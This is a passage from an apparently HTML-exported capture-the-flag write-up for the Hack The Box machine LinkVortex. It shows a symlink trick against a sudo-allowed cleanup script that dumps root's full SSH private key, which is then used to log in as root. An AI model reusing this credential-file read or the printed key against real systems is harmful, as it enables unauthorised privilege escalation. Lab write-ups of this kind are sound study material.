+</p><p id="16fd1b9f-8847-8050-bc11-de4144dab393" class="">If u wanna root shell, just read id_rsa</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16fd1b9f-8847-801d-a10c-da6bfc1a5ec9" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">bob@linkvortex:~$ ln -s /root/.ssh/id_rsa flag.txt
+bob@linkvortex:~$ ln -s /home/bob/flag.txt flag.png
+bob@linkvortex:~$ sudo CHECK_CONTENT=true /usr/bin/bash /opt/ghost/clean_symlink.sh /home/bob/flag.png 
+Link found [ /home/bob/flag.png ] , moving it to quarantine
+Content:
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+</code></pre><p id="16fd1b9f-8847-808d-8cdc-f476506c4f40" class="">Copy that to your own id_rsa file</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="16fd1b9f-8847-80b0-8b46-f96fffae0df4" class="code"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028]
+└─$ nano id_rsa_linkvortex
+                                                                                                                 
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028]
+└─$ chmod 600 id_rsa_linkvortex                 
+                                                                                                                 
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028]
+└─$ ssh -i id_rsa_linkvortex root@linkvortex.htb
+Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the &#x27;unminimize&#x27; command.
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Mon Dec  2 11:20:43 2024 from 10.10.14.61
+root@linkvortex:~# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>
